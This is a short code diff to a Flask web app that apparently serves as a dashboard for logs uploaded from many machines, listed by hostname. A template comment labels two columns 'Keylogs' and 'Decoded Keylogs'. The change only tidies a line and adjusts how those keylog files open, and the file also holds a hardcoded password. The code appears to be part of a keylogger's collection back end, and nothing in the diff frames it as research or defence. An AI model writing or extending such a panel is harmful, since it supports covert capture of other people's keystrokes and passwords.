@@ -7,7 +7,7 @@ import pytz
 UPLOAD_ROOT = "logs"
 PASSWORD = "disha456"
 
-app = Flask(__name__) 
+app = Flask(__name__)
 os.makedirs(UPLOAD_ROOT, exist_ok=True)
 
 COLUMNS = [
@@ -51,8 +51,16 @@ HTML_TEMPLATE = '''
         <tr>
           <td>{{ folder.hostname }}</td>
           <td>{{ folder.timestamp }}</td>
-          {% for file in folder.files %}
-            <td>{% if file %}<a href="{{ file }}">📅 View/Download</a>{% else %}-{% endif %}</td>
+          {% for i, file in enumerate(folder.files) %}
+            <td>
+              {% if file %}
+                {% if i == 3 or i == 4 %}  {# Index 3 = Keylogs, Index 4 = Decoded Keylogs #}
+                  <a href="{{ file }}" target="_blank">📄 View</a>
+                {% else %}
+                  <a href="{{ file }}">📥 View/Download</a>
+                {% endif %}
+              {% else %}-{% endif %}
+            </td>
           {% endfor %}
         </tr>
       {% endfor %}
